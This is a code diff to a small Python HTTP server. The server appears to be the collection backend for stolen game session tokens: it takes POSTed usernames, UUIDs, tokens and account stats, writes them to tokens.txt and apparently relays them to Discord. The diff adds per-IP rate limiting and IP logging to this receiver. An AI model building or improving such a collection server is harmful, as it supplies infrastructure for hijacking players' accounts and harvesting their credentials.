@@ -3,6 +3,42 @@ import json
 import urllib.request
 import urllib.error
 import os
+import time
+from collections import defaultdict
+
+# =========== RATE LIMITING ===========
+REQUEST_LOG = defaultdict(list)  # Tracks requests per IP
+MAX_REQUESTS = 2  # Maximum 2 requests
+TIME_WINDOW = 900  # 15 minutes in seconds (15 * 60)
+BLOCKED_IPS_FILE = "blocked_ips.txt"
+IP_LOG_FILE = "ip_log.txt"
+
+def check_rate_limit(ip):
+    """Check if IP exceeds rate limit (2 requests per 15 minutes)"""
+    current_time = time.time()
+    
+    # Clean old requests (older than 15 minutes)
+    REQUEST_LOG[ip] = [t for t in REQUEST_LOG[ip] if current_time - t < TIME_WINDOW]
+    
+    # Check if exceeds limit
+    if len(REQUEST_LOG[ip]) >= MAX_REQUESTS:
+        print(f"🚨 RATE LIMIT EXCEEDED: {ip} - Blocked for 15 minutes")
+        
+        # Log blocked IP
+        with open(BLOCKED_IPS_FILE, 'a') as f:
+            f.write(f"{ip} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+        
+        return False  # Block this request
+    
+    # Add this request to log
+    REQUEST_LOG[ip].append(current_time)
+    return True  # Allow this request
+
+def log_ip(ip, username, server):
+    """Log all IPs that connect"""
+    with open(IP_LOG_FILE, 'a') as f:
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        f.write(f"{timestamp} | {ip} | {username} | {server}\n")
 
 # =========== CONFIG LOADING ===========
 def load_config():
@@ -32,6 +68,18 @@ print("✅ Config loaded")
 class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         try:
+            # Get client IP
+            client_ip = self.client_address[0]
+            print(f"📨 Request from IP: {client_ip}")
+            
+            # Check rate limit
+            if not check_rate_limit(client_ip):
+                self.send_response(429)  # Too Many Requests
+                self.send_header('Content-type', 'text/plain')
+                self.end_headers()
+                self.wfile.write(b'Rate limit exceeded: 2 requests per 15 minutes')
+                return
+            
             length = int(self.headers['Content-Length'])
             data = json.loads(self.rfile.read(length).decode())
             
@@ -47,6 +95,9 @@ class Handler(BaseHTTPRequestHandler):
             log_type = data.get('type', 'login').strip()
             
             print(f"Got: {username} on {server}")
+            
+            # Log IP
+            log_ip(client_ip, username, server)
             
             with open('tokens.txt', 'a') as f:
                 f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
@@ -105,6 +156,7 @@ class Handler(BaseHTTPRequestHandler):
                 print(f"❌ Discord error: {e}")
             
             self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
             self.end_headers()
             self.wfile.write(b'OK')
             
@@ -115,12 +167,16 @@ class Handler(BaseHTTPRequestHandler):
     
     def do_GET(self):
         self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b'Server running')
+        self.wfile.write(b'Server running - Rate limit: 2 requests per 15 minutes per IP')
     
     def log_message(self, format, *args):
-        pass
+        # Log IP with each request
+        client_ip = self.client_address[0]
+        print(f"{self.log_date_time_string()} - {client_ip} - {args[0]}")
 
 print("🚀 Server starting on port 5000")
+print("📊 Rate limit: 2 requests per 15 minutes per IP")
 server = HTTPServer(('0.0.0.0', 5000), Handler)
 server.serve_forever()
